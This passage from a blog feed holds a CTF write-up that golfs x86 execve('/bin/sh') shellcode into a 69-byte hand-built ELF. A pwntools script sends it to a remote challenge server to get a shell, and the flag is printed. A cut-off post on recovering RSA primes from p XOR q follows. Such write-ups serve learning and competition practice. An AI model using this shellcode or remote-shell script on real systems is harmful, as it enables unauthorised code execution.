+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syscall&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;just for ref: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db, dw, dd, dq&lt;/code&gt; correspond to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1, 2, 4, 8&lt;/code&gt; bytes. next i turned this assembly into an executable.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; bin &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell shell.s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and it works as expected. let’s check the size of the executable&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; tiny
+154 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;so it’s still &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;154 bytes&lt;/code&gt; and we still have a long way to go. i still had to optimise this. i wondered if i could shorten up the assembly&lt;/p&gt;
+
+&lt;h2 id=&quot;golfing-the-text-section&quot;&gt;Golfing the .text section&lt;/h2&gt;
+&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt; section took about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;34 bytes&lt;/code&gt; itself. first of all, it’s possible to completely get rid of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data section&lt;/code&gt;. we need to move the string directly into a register, then pop it onto the stack. now the address corresponding to the string is just the stack pointer (the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_start:
+    xor rax, rax
+    push rax 
+    mov rdi, 0x68732f6e69622f2f
+    push rdi 
+
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 59
+    syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text section&lt;/code&gt; drops to just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;31 bytes&lt;/code&gt; now. if observe carefully, some assembly instructions in there are just simply redundant. once we get rid of these, this drops to a mere &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22 bytes&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_start:
+    push rax 
+    mov rdi, 0x68732f6e69622f2f
+    push rdi 
+
+    mov rdi, rsp
+    mov rax, 59
+    syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;despite all that, the overall size of the executable is still &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;142 bytes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; tiny
+142 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we need to almost cut the size by half!&lt;/p&gt;
+&lt;h2 id=&quot;switching-to-32-bit-elf&quot;&gt;Switching to 32-bit ELF&lt;/h2&gt;
+&lt;p&gt;we noticed that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86_64&lt;/code&gt; is actually backwards compatible and it therefore can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt; executables given that the headers used are appropriate. i switched all my progress to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt; format and the size of the executable drops to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;105 bytes&lt;/code&gt;!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bits 32
+org     0x08048000
+  
+ehdr:                                                 ; Elf32_Ehdr
+        db      0x7F, &quot;ELF&quot;, 1, 1, 1, 0         ;   e_ident
+times 8 db      0
+        dw      2                               ;   e_type
+        dw      3                               ;   e_machine
+        dd      1                               ;   e_version
+        dd      _start                          ;   e_entry
+        dd      phdr - $$                       ;   e_phoff
+        dd      0                               ;   e_shoff
+        dd      0                               ;   e_flags
+        dw      ehdrsize                        ;   e_ehsize
+        dw      phdrsize                        ;   e_phentsize
+        dw      1                               ;   e_phnum
+        dw      0                               ;   e_shentsize
+        dw      0                               ;   e_shnum
+        dw      0                               ;   e_shstrndx
+  
+ehdrsize      equ     $ - ehdr
+  
+phdr:                                                 ; Elf32_Phdr
+        dd      1                               ;   p_type
+        dd      0                               ;   p_offset
+        dd      $$                              ;   p_vaddr
+        dd      $$                              ;   p_paddr
+        dd      filesize                        ;   p_filesz
+        dd      filesize                        ;   p_memsz
+        dd      5                               ;   p_flags
+        dd      0x1000                          ;   p_align
+  
+phdrsize      equ     $ - phdr
+
+_start:
+    push    eax
+    push    0x68732f6e  ; &apos;n/sh&apos;
+    push    0x69622f2f  ; &apos;//bi&apos;
+    mov     ebx, esp    ; pointer to &apos;/bin/sh\0&apos;
+    push    eax
+    push    ebx
+    mov     ecx, esp    ; pointer to argv
+    mov     al, 0xb     ; syscall number for execve
+    int     0x80
+  
+filesize      equ     $ - $$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;we could try golfing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text section&lt;/code&gt; again. currently, it’s about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21 bytes&lt;/code&gt; in size. i was able to cut-down &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4 bytes&lt;/code&gt; more.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_start:      
+    push   eax              
+    push   0x68732f6e       
+    push   0x69622f2f       
+    mov    ebx, esp         
+    mov    al, 0xb          
+    int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;so that brings us to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;101 bytes&lt;/code&gt;!&lt;/p&gt;
+
+&lt;h2 id=&quot;embedding-phdr-inside-ehdr&quot;&gt;Embedding PHDR inside EHDR&lt;/h2&gt;
+&lt;p&gt;if you scroll down to the bottom of the article, the article authose explains how it’s possible to merge the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;program header&lt;/code&gt; completely within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELF header&lt;/code&gt;. since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELF header&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt; system is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;52 bytes&lt;/code&gt; large, we’ll able to cut down &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;48 bytes&lt;/code&gt; in this optimization! we can then append out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text section&lt;/code&gt; right below the headers. this should bring the executable size to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;69 bytes&lt;/code&gt; which fits right into the constraints.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BITS 32
+
+            org     0x00010000
+
+            db      0x7F, &quot;ELF&quot;             ; e_ident
+            dd      1                                       ; p_type
+            dd      0                                       ; p_offset
+            dd      $$                                      ; p_vaddr 
+            dw      2                       ; e_type        ; p_paddr
+            dw      3                       ; e_machine
+            dd      _start                  ; e_version     ; p_filesz
+            dd      _start                  ; e_entry       ; p_memsz
+            dd      4                       ; e_phoff       ; p_flags
+fake:
+            mov     bl, 42                  ; e_shoff       ; p_align
+            xor     eax, eax
+            inc     eax                     ; e_flags
+            int     0x80
+            db      0
+            dw      0x34                    ; e_ehsize
+            dw      0x20                    ; e_phentsize
+            dw      1                       ; e_phnum
+            dw      0                       ; e_shentsize
+            dw      0                       ; e_shnum
+            dw      0                       ; e_shstrndx
+_start:
+    push   eax              
+    push   0x68732f6e       
+    push   0x69622f2f       
+    mov    ebx, esp         
+    mov    al, 0xb          
+    int    0x80
+
+filesize      equ     $ - $$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;here’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; that makes the executable generation steps a lot less clumsy.&lt;/p&gt;
+
+&lt;div class=&quot;language-makefile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;
+&lt;span class=&quot;nl&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;bin&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-Ox&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;shell.s&lt;/span&gt;
+&lt;span class=&quot;nl&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+x&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;shell&lt;/span&gt;
+&lt;span class=&quot;nl&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;link&lt;/span&gt;
+    &lt;span class=&quot;nl&quot;&gt;@ls -l shell | awk &apos;{print $$5}&apos; | xargs -I {} echo &quot;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;{} bytes&quot;&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;@./shell&lt;/span&gt;
+&lt;span class=&quot;nl&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;shell.o&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;shell&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;upon executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make run&lt;/code&gt; it seems to work fine! and we can confirm the size of the executable using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wc&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; tiny
+69 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;i prepared a small python script to test if this actually works&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; 
+
+&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./shell&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and upon executing this python file, as anyone can confirm this certainly works! i grabbed the executable and quickly wrote the a script to send this to the remote server.&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./tiny&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;elf_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;rb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;89.169.156.185&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10200&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DEBUG&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ELF x64 executable: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and that gives us the shell as expected on the remote server!&lt;/p&gt;
+
+&lt;h2 id=&quot;flag&quot;&gt;Flag&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brics+{0cc8bfea-ec2d-4e68-8c2e-7e55db59cd1a}&lt;/code&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Branching and Pruning</title>
+   <link href="http://localhost:4000/2024/02/03/branching-pruning/"/>
+   <updated>2024-02-03T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2024/02/03/branching-pruning</id>
+   <content type="html">&lt;p&gt;Today I’ll be discussing a really useful implementation heavy technique that leads to a bit by bit leakage of information of variables when provided some extra information. The best way to demonstrate this is through examples so let’s get started&lt;/p&gt;
+
+&lt;h2 id=&quot;xorsa-plaidctf-2021&quot;&gt;XORSA [PlaidCTF 2021]&lt;/h2&gt;
+
+&lt;p&gt;This is a typical RSA challenge that provides you the information of $n$, $e$ and $c$ and along with that, we are given the information $p \oplus q$ (bitwise XOR). As it turns out that a RSA system with $p\oplus q$ and $p\times q$ publically known is cryptographically insecure!&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;The idea is that we could leak the bits of the primes $p$ and $q$ one by one starting from the LSB (least significant bit). Since in this case, $p$ and $q$ are odd. Therefore, we already know their LSB’s, that is $1$. Suppose we are at the $i$th bit from the left and we have figured out all the bits $p_k$ and $q_k$ for $k &amp;lt; i$. Then there are four possible cases for each such valid number that we’ve found yet. Our strategy would be to check if in any of these four cases we could extend our found solution from $i - 1$ to $i$. We perform this recursively $\log N$ times to solve for $p$ and $q$. Here’s an implementation for the same!&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cryptodome.Util.number&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;math&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# insert p*q here
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# insert p xor q here
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
